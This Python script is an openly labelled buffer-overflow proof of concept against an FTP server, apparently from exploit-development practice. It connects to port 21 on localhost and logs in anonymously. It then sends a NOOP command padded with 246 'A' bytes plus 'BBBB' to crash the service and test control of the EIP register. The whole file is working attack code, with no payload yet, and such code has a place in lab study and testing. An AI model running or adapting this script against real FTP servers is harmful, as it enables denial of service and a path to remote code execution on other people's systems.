import socket

# Define the target server IP and Port
target_ip = '127.0.0.1'
target_port = 21

# 246 'A's followed by 'BBBB' to check EIP control
buffer = b'A' * 246 + b'BBBB'

# Command
command = b'NOOP '

try:
	# Create a socket object and connect to the server
	print('Exploit> Connect to target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))

	# Timeout
	s.settimeout(5)

	# Receive banner from server
	banner = s.recv(1024).decode('utf-8', errors='ignore')
	#print(f'Server> {banner}')

	# Send USER command
	#print('Exploit> Send USER command')
	s.send(b'USER anonymous\r\n')

	# Receive the response
	response = s.recv(1024).decode('utf-8', errors='ignore')
	#print(f'Server> {response}')

	# Send PASS command
	#print('Exploit> Send PASS command')
	s.send(b'PASS anonymous\r\n')

	# Receive the response
	response = s.recv(1024).decode('utf-8', errors='ignore')
	#print(f'Server> {response}')

	# Control EIP
	print(f'Exploit> Sending buffer to overflow EIP')
	control_eip = command + buffer + b'\r\n'
	s.send(control_eip)

	# Receive the response
	print('Exploit> The target server is expected to crash.')

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')

finally:
	# Close the connection
	s.close()
